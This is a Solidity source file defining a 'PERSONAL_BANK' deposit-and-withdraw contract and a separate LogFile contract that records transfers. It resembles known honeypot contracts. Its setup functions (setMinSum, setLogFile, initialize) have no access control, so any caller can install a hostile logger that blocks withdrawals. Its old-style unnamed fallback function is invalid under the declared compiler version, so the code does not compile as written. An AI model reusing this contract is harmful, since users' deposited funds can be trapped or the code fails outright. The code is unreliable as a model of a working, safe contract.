pragma solidity ^0.8.0;

contract PERSONAL_BANK {
    mapping (address => uint256) public balances;
    uint256 public MinSum = 1 ether;
    LogFile public Log;
    bool public initialized;

    function setMinSum(uint256 _val) public {
        require(!initialized, "Contract already initialized");
        MinSum = _val;
    }

    function setLogFile(LogFile _log) public {
        require(!initialized, "Contract already initialized");
        Log = _log;
    }

    function initialize() public {
        initialized = true;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        Log.addMessage(msg.sender, msg.value, "Put");
    }

    function collect(uint256 _am) public {
        require(balances[msg.sender] >= MinSum, "Balance is less than MinSum");
        require(balances[msg.sender] >= _am, "Requested amount is greater than balance");
        balances[msg.sender] -= _am;
        (bool success, ) = msg.sender.call{value: _am}("");
        require(success, "Transfer failed");
        Log.addMessage(msg.sender, _am, "Collect");
    }

    function() external payable {
        deposit();
    }
}

contract LogFile {
    struct Message {
        address Sender;
        string Data;
        uint256 Val;
        uint256 Time;
    }

    Message[] public History;

    function addMessage(address _adr, uint256 _val, string memory _data) public {
        Message memory newMessage = Message({
            Sender: _adr,
            Time: block.timestamp,
            Val: _val,
            Data: _data
        });
        History.push(newMessage);
    }
}